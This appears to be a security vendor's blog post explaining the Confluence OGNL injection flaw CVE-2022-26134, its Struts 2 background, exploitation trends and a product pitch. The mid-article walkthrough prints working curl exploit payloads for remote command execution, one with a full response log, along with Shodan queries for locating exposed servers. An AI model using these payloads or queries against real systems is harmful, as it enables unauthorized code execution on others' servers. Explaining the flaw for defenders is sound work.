# Picus-Journey

# CVE-2022-26134 vulnerability: Same, but different, but still same.

On June 2, 2022, Atlassian published a series of security advisories against the CVE-2022-26134 vulnerability for one of the company’s well-known products named Confluence Server and Data Center. It was an **OGNL injection vulnerability** that would allow an **unauthenticated attacker** to **execute arbitrary code** on a Confluence Server or Data Center instance.

Atlassian has decided to publish these security advisories before a fabricated patch is released for the vulnerability. When Atlassian announced affected versions of Confluence Server and Data Center on June 2, it was easy to notice [**by a security researcher**](https://csirt.divd.nl/cases/DIVD-2022-00033/) that all **supported versions** were affected even if the company tried to point out all affected versions one by one.

By June 3 all Confluence Server and Data Center users are urged to apply patches published by Atlassian. Enterprises unable to patch should apply the recommended workarounds, as explained in an [**advisory by Atlassian**](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html).

Although publishing it may seem a hard or even a careless decision at first glance, when we look at this publication from company’s point of view we can consider that move “well-played”. Because, the vulnerability was **easy to exploit,** **had big impacts**, and in exchange of **no cost**... According to the company authorities, necessary action had to be taken!  

## What Happened? Why Atlassian again?

CVE-2022-26134 was the fifth RCE vulnerability discovered in the past three years in Confluence Server and Data Center’s source code. It is also important to point out that, these vulnerabilities are evaluated as **high** or worse, **critical**! 

Frankly, it would not be wrong to say that the last few years of Atlassian have been difficult for a number of reasons, including the latest RCE and some other security vulnerabilities. So, does this mean that Atlassian's software security or software development team is doing a bad or lousy job? Although this subject is in a position that allows many speculative approaches in its essence, our article aims to put a bigger picture at its center, not Atlassian.

### What is the bigger picture?

As for the **big picture** we want to draw attention to, quoting from Oracle's [own site](https://www.oracle.com/java/):

> “Java is the #1 programming language and development platform. [..] With millions of developers running more than 51 billion Java Virtual Machines worldwide, Java continues to be the development platform of choice for enterprises and developers.”
> 

According to Oracle itself :

- 97% of Enterprise Desktops Run Java
- 89% of Desktops (or Computers) in the U.S. Run Java
- There are 9 Million Java Developers Worldwide
- Java is the #1 Choice for Developers
- Java is the #1 Development Platform
- 3 Billion Mobile Phones Run Java

***But why are these figures important for the big picture?***

Well, when we talk about Java, we must look at that as we look at Window’s security. Does Windows have more vulnerabilities than MacOS? Contrariwise, because Windows users are usually corporate employees, Windows targets just have more corporate value than MacOS users themselves. For this reason, the first criterion we should consider when looking at security vulnerabilities in Java code or commercial products written in Java is that the product or code itself is a commercially high-value target if it can be successfully exploited. When a Zero-Day vulnerability hits Java, most of these users and companies are affected. It’s not just a minor glitch: it’s a threat that can endanger people’s finances and the company’s assets. 

In addition Java’s value for threat actors, when we consider Atlassian as a specific target: 

- It has been used by many companies with a high commercial value for years.
- Has a considerable weakness that, frequently  exploitable with big impact.

So we can easily say, there will be no surprise to catch all threat actors eyes on Atlasaian products. 

### Main Suspect: **OGNL security issues**

OGNL is infamous for related vulnerabilities found in the **Struts 2** framework that relies on it. In a nutshell, Because **OGNL has the ability to create or change executable code**, it is also capable of introducing critical security flaws to any framework that uses it.

![6jc64q.jpg](CVE-2022-26134%20vulnerability%20Same,%20but%20different,%20%205b01c0065b3940e19680b3c3e75656f6/6jc64q.jpg)

According to Wikipedia page of OGNL security issues: 

> “Due to its ability to create or **change executable code**, OGNL is capable of **introducing critical security flaws to any framework that uses** it. Multiple [Apache Struts 2](https://en.wikipedia.org/wiki/Apache_Struts_2) versions have been vulnerable to OGNL security [flaws](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-6117/Apache-Struts.html)”
> 

As of October 2017, the recommended version of Struts 2 is 2.5.13. Users are urged to upgrade to the latest version, as older revisions have documented security vulnerabilities — for example, Struts 2 versions 2.3.5 through 2.3.31, and 2.5 through 2.5.10. Atlassian Confluence has [repeatedly](https://jira.atlassian.com/browse/CONFSERVER-67940)
 been [affected](https://jira.atlassian.com/browse/CONFSERVER-79000) by OGNL security issues that allowed arbitrary remote code execution, and required all users to update.

[https://gifer.com/embed/2lY](https://gifer.com/embed/2lY)

If we look at **[Struts 2](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-6117/Apache-Struts.html)’s** CVE list [closely](https://www.cvedetails.com/cve/CVE-2013-2134/), we can easily notice that security issues starts from 2013 and still continues. 

# How does it work?

![**[Figure 1](https://twitter.com/ptswarm/status/1533805332409069568) - how the vulnerability works under the hood**](CVE-2022-26134%20vulnerability%20Same,%20but%20different,%20%205b01c0065b3940e19680b3c3e75656f6/Untitled.png)

**[Figure 1](https://twitter.com/ptswarm/status/1533805332409069568) - how the vulnerability works under the hood**

As we can see from the good explanation of PTswarm team, CVE-2022-26314 is an unauthenticated and remote OGNL injection vulnerability resulting in code execution in the context of the Confluence server (typically the `confluence` user on Linux installations). Given the nature of the vulnerability, [internet-facing](https://www.shodan.io/search?query=X-Confluence-Request-Time) Confluence servers are at very high risk.

The call stack demonstrates the OGNL injection starting from `HttpServlet.service` to `OgnlValueStack.findValue`and beyond. As stated, OGNL injection vulnerability affecting the HTTP server. The OGNL payload is placed in the URI of an HTTP request. Any type of HTTP method appears to work, whether valid (GET, POST, PUT, etc) or invalid (e.g. “BALH”). Even though `setCookie`parameter is more convenient stable for exploitation, In its simplest form,  abusing the vulnerability looks like this:

```bash
curl -v http://CONFLUENCESERVER:8090/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20/tmp/PicusTeam%22%29%7D/
```

As you can see the payload is URL-encoded. The exploit encompasses everything from the start of the content location to the last instance of `/`. Decoded it looks like this:

```java
${@java.lang.Runtime@getRuntime().exec("touch /tmp/PicusTeam")}

```

> “*Scanning for vulnerable servers is easy because exploitation allows attackers to force the server to send command output in the HTTP response. For example, the following request will return the response of `whoami` in the attacker-created `X-Cmd-Response` HTTP field (credit to Rapid7’s Brandon Turner for the exploit below). Note the `X-Cmd-Response: confluence` line in the HTTP response*:
> 

```bash
curl -v http://10.0.0.28:8090/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
*   Trying 10.0.0.28:8090...
* TCP_NODELAY set
* Connected to 10.0.0.28 (10.0.0.28) port 8090 (#0)
> GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
> Host: 10.0.0.28:8090
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 
< Cache-Control: no-store
< Expires: Thu, 01 Jan 1970 00:00:00 GMT
< X-Confluence-Request-Time: 1654212503090
< Set-Cookie: JSESSIONID=34154443DC363351DD0FE3D1EC3BEE01; Path=/; HttpOnly
< X-XSS-Protection: 1; mode=block
< X-Content-Type-Options: nosniff
< X-Frame-Options: SAMEORIGIN
< Content-Security-Policy: frame-ancestors 'self'
< X-Cmd-Response: confluence 
< Location: /login.action?os_destination=%2F%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D%2Findex.action&permissionViolation=true
< Content-Type: text/html;charset=UTF-8
< Content-Length: 0
< Date: Thu, 02 Jun 2022 23:28:23 GMT
< 
* Connection #0 to host 10.0.0.28 left intact
```

 

### Patch is published and is it over?

If we want to search for potentially vulnerable machines in the wild, for **[Shodan](https://www.shodan.io/search?query=X-Confluence-Request-Time+http.favicon.hash%3A-305179312)** we can easily use these queries: `X-Confluence-Request-Time http.favicon.hash:-305179312` , `X-Confluence-Request-Time` or just `http.favicon.hash:-305179312` . And at time this article was written, the picture was seem far from over. 

According to **[GreyNoise](https://viz.greynoise.io/query/?gnql=tags%3A%22Atlassian%20Confluence%20Server%20CVE-2022-26134%20OGNL%20Injection%20Attempt%22)**, there was just a 23 uniqe Ip trying to exploit this vulnerability till the patch is published. By June 3, the patch was released, but simultaneously with it, POC samples allowing mass scan were also popped up from everywhere. So the unique Ip number was trying to exploit after the 3th of June increased dramatically. 

[atlassian-confluence-server-cve-2022-26134-ognl-injection-attempt_20220609_1024.txt](CVE-2022-26134%20vulnerability%20Same,%20but%20different,%20%205b01c0065b3940e19680b3c3e75656f6/atlassian-confluence-server-cve-2022-26134-ognl-injection-attempt_20220609_1024.txt)

As of June 10, more than **1000 unique IPs** and **multiple threat actors** were associated with the issue. One of the biggest threat actor was [**ONYPHE](https://viz.greynoise.io/query/?gnql=tags%3A%22Atlassian%20Confluence%20Server%20CVE-2022-26134%20OGNL%20Injection%20Attempt%22%20actor%3A%22ONYPHE%22).** 

**Kinsing** was another threat actor also has targeted Confluence in the past using another critical Atlassian Confluence RCE flaw [to install cryptomining malwar](https://www.bleepingcomputer.com/news/security/atlassian-confluence-flaw-actively-exploited-to-install-cryptominers/)e after a PoC exploit was released online.

According to [LaceworkLabs](https://twitter.com/laceworklabs): **Kinsing** came to the scene later on the days of vulnerability. 

[https://twitter.com/Lacework/status/1534209271239417858?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed&ref_url=notion%3A%2F%2Fwww.notion.so%2FDraft-53b2eecb98634d39b4ebd3e0f3a8e829](https://twitter.com/Lacework/status/1534209271239417858?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed&ref_url=notion%3A%2F%2Fwww.notion.so%2FDraft-53b2eecb98634d39b4ebd3e0f3a8e829)

And if we check [**CVETrends**](https://cvetrends.com/) and [**GreyNoise CVE trends**](https://viz.greynoise.io/trends) we can easily realize that even 8 days after the patch was released, it is still among the top trends.

## What we should do after all?

There is more than one method to avoid these Zero-Days and similar vulnerabilities. If we just talk about the specific topic for that vulnerability, I could say considering implementation of RASP technologies is really important for prevention of Java based or OGNL based vulnerabilities. But if we consider this topic wider than OGNL injections, “Detection as Code” is the best practise for preventing these type of security flaws. **Picus Security’s** log validation and **BAS** (Breach Attack Simulation) services, help your organizations’ prevention from the attacks before the breach happens. 

Because of our **threat library** is updated **on a daily basis**, thanks to the fact that breach validation can be tested on all your security products, it becomes possible to implement and take precautions against such attacks even **before security patches against the vulnerability are released.**
